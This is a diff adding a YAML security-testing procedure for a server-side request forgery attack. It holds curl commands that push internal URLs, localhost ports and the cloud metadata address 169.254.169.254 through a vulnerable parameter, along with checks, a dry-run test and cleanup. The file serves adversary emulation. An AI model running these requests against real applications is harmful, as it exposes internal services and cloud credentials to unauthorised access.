@@ -1,0 +1,107 @@
+name: "019: SSRF attack"
+description: "Exploit Server-Side Request Forgery (SSRF) to access internal resources and services"
+id: "l2m5i7n0-6k9j-2i4n-7l0m-3j1k6i9n4m5l"
+api_version: "2.0"
+platform: darwin
+tags:
+  - initial_access
+  - web_exploitation
+  - ssrf
+  - internal_network_access
+actors: []
+mitre_attack:
+  tactics:
+    - initial_access
+  techniques:
+    - T1190
+procedure_examples: []
+arguments:
+  target_url:
+    description: "Target application URL with SSRF vulnerability"
+    type: string
+    required: true
+    default: "http://vulnerable-app.local/fetch"
+  url_parameter:
+    description: "Parameter accepting URL input"
+    type: string
+    required: true
+    default: "url"
+  target_resource:
+    description: "Internal resource to access via SSRF"
+    type: string
+    required: true
+    default: "http://localhost:8000"
+  ssrf_type:
+    description: "Type of SSRF (basic, blind, time_based, port_scan)"
+    type: string
+    required: true
+    default: "basic"
+steps:
+  - name: "Identify SSRF parameter"
+    description: "Identify parameter vulnerable to SSRF"
+    command: |
+      echo "[*] Identifying SSRF parameter: ${url_parameter}"
+      curl -s "${target_url}" | grep -i "url\|fetch\|proxy\|download" | head -10
+  - name: "Craft SSRF payload"
+    description: "Create SSRF payload to access internal resources"
+    command: |
+      echo "[*] Crafting SSRF payload"
+      echo "[*] SSRF Type: ${ssrf_type}"
+      case "${ssrf_type}" in
+        basic)
+          payload="${target_resource}"
+          ;;
+        blind)
+          payload="http://localhost:22"
+          ;;
+        time_based)
+          payload="http://localhost:8000"
+          ;;
+        port_scan)
+          payload="http://127.0.0.1:9000"
+          ;;
+      esac
+      echo "[*] Payload: ${payload}"
+  - name: "Send SSRF request"
+    description: "Send SSRF payload to the target"
+    command: |
+      echo "[*] Sending SSRF payload to ${target_url}"
+      encoded=$(echo "${target_resource}" | jq -sRr @uri)
+      curl -s "${target_url}?${url_parameter}=${encoded}" -m 5 > /tmp/ssrf_response.txt 2>&1
+      echo "[+] Response captured"
+      head -50 /tmp/ssrf_response.txt
+  - name: "Access internal services"
+    description: "Attempt to access internal services via SSRF"
+    command: |
+      echo "[*] Attempting to access internal services"
+      echo "[*] Testing internal metadata service..."
+      meta_url="http://169.254.169.254/latest/meta-data/"
+      encoded=$(echo "${meta_url}" | jq -sRr @uri)
+      curl -s "${target_url}?${url_parameter}=${encoded}" -m 5 > /tmp/ssrf_metadata.txt 2>&1 || true
+      [ -s /tmp/ssrf_metadata.txt ] && echo "[+] Metadata accessible" || echo "[-] Metadata not accessible"
+checks:
+  - name: "SSRF response check"
+    description: "Verify SSRF request was processed"
+    command: "[ -s /tmp/ssrf_response.txt ] && echo 'PASS' || echo 'FAIL'"
+  - name: "Internal resource access"
+    description: "Verify internal resource was accessed"
+    command: "grep -qi 'localhost\\|127.0.0.1\\|internal\\|refused' /tmp/ssrf_response.txt && echo 'PASS' || echo 'FAIL'"
+tests:
+  - name: "ssrf_test"
+    description: "Test SSRF vulnerability in dry run mode"
+    dry_run: true
+    command: |
+      echo "[TEST] SSRF Attack Test (Dry Run)"
+      echo "[TEST] Target: ${target_url}"
+      echo "[TEST] Parameter: ${url_parameter}"
+      echo "[TEST] Internal resource: ${target_resource}"
+      echo "[TEST] Type: ${ssrf_type}"
+      echo "[TEST] Would send SSRF requests to access internal resources"
+cleanup:
+  - name: "Remove SSRF artifacts"
+    description: "Clean up SSRF testing files"
+    command: |
+      echo "[*] Cleaning up SSRF artifacts"
+      rm -f /tmp/ssrf_response.txt 2>/dev/null
+      rm -f /tmp/ssrf_metadata.txt 2>/dev/null
+      echo "[+] SSRF cleanup complete"
